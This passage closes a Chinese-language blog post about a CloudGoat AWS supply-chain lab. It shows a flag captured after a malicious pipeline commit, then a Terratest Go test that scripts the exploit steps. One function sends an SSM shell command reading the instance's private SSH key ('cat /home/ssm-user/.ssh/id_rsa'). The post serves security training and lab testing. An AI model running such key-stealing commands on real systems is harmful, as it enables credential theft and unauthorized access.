+<p>一旦我们执行了恶意提交，CodePipeline管道就会获取我们的更改并开始将其推出到生产环境：</p>
+<p>几分钟后，我们成功地后门了应用程序并捕获了标志！</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">START RequestId: 3bd6cd1e-9e01-4012-859d-70c9fcd9d643 Version: $LATEST
+</span></span><span class="line"><span class="cl">superSecretData=FLAG{SupplyCh4!nS3curityM4tt3r5&#34;}
+</span></span><span class="line"><span class="cl">END RequestId: 3bd6cd1e-9e01-4012-859d-70c9fcd9d643
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="使用端到端测试进行持续测试">使用端到端测试进行持续测试
+</h2><p>如前所述，该场景基于Terraform代码，负责创建VPC、EC2实例、管道等。Terraform代码并不简单。我们如何高度自信地认为它持续按预期工作？回想一下，在我们的上下文中，&ldquo;工作&quot;意味着处于可以通过预期步骤利用的状态。</p>
+<p>我们利用了Terratest，这是一个用于测试Terraform代码的Go库。更具体地说，我们编写了如下工作的Go测试：</p>
+<ol>
+<li>使用Terratest运行我们的Terraform代码，针对实时AWS环境。资源实际部署到AWS。</li>
+<li>从我们的Go测试中，向FooCorp API发送实际的HTTP请求，以确保它已正确部署。</li>
+<li>仍然从我们的Go测试中，以编程方式执行漏洞利用步骤，一步一步来。</li>
+<li>测试完成后，销毁我们通过Terraform代码配置的基础设施。</li>
+</ol>
+<p>然后我们可以使用<code>go test</code>运行我们的测试，可以手动运行，也可以在每次拉取请求时自动运行。以下是&quot;以代码形式存在的漏洞利用步骤&quot;的样子：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">test</span> <span class="o">*</span><span class="nx">EndToEndTest</span><span class="p">)</span> <span class="nf">StealPrivateSSHKey</span><span class="p">(</span><span class="nx">instanceId</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 在实例上执行SSM命令以窃取SSH私钥</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">ssmClient</span> <span class="o">:=</span> <span class="nx">ssm</span><span class="p">.</span><span class="nf">NewFromConfig</span><span class="p">(</span><span class="nx">test</span><span class="p">.</span><span class="nx">awsConfig</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">result</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">ssmClient</span><span class="p">.</span><span class="nf">SendCommand</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">TODO</span><span class="p">(),</span> <span class="o">&amp;</span><span class="nx">ssm</span><span class="p">.</span><span class="nx">SendCommandInput</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">DocumentName</span><span class="p">:</span> <span class="nx">aws</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="s">&#34;AWS-RunShellScript&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">InstanceIds</span><span class="p">:</span>  <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="nx">instanceId</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">Parameters</span><span class="p">:</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">][]</span><span class="kt">string</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s">&#34;commands&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s">&#34;cat /home/ssm-user/.ssh/id_rsa&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="p">})</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">test</span><span class="p">.</span><span class="nx">assert</span><span class="p">.</span><span class="nf">Nil</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;Unable to send SSM command to instance&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="c1">// 等待SSM命令的输出</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">commandOutput</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">ssm</span><span class="p">.</span><span class="nf">NewCommandExecutedWaiter</span><span class="p">(</span><span class="nx">ssmClient</span><span class="p">).</span><span class="nf">WaitForOutput</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">TODO</span><span class="p">(),</span> <span class="o">&amp;</span><span class="nx">ssm</span><span class="p">.</span><span class="nx">GetCommandInvocationInput</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">CommandId</span><span class="p">:</span>  <span class="nx">result</span><span class="p">.</span><span class="nx">Command</span><span class="p">.</span><span class="nx">CommandId</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">InstanceId</span><span class="p">:</span> <span class="o">&amp;</span><span class="nx">instanceId</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span> <span class="mi">2</span><span class="o">*</span><span class="nx">time</span><span class="p">.</span><span class="nx">Minute</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">test</span><span class="p">.</span><span class="nx">assert</span><span class="p">.</span><span class="nf">Nil</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;failed to retrieve SSM command output&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// 我们成功窃取了SSH私钥</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="o">*</span><span class="nx">commandOutput</span><span class="p">.</span><span class="nx">StandardOutputContent</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">--- PASS: TestScenario <span class="o">(</span>248.47s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PASS
+</span></span><span class="line"><span class="cl">ok  	github.com/cloudgoat/tests/supply-chain-security	249.070s
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="结论">结论
+</h2><p>我鼓励您尝试这个场景！更广泛地说，CloudGoat有一组有价值的实验室，包含许多现实世界的AWS漏洞。</p>
+<p>您对这个场景有什么看法？您如何测试您的安全实验室？您希望在CloudGoat中看到什么？让我们在Twitter上继续讨论！</p>
+<p>感谢RhinoSecurityLabs的Ryan Gerstenkorn提供的出色贡献体验！感谢您的阅读。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/aws%E5%AE%89%E5%85%A8/">AWS安全</a>
+        
+            <a href="/tags/devops/">DevOps</a>
+        
+            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">漏洞利用</a>
+        
+            <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/">云安全</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+
+
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 qife
+    </section>
+    
+    <section class="powerby">
+        
+
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+
+            
+
+    <div class="busuanzi-footer">
+      <span id="busuanzi_container_site_pv">
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+      </span>
+      <span id="busuanzi_container_site_uv">
+        本站访客数<span id="busuanzi_value_site_uv"></span>人次
+      </span>
+    </div>
+
+    </section>
+
+    
+
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.313ab02d2f8415261a3718a5b3d0e35b62826b81a7f2c46c8122082f4cba0bcf.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
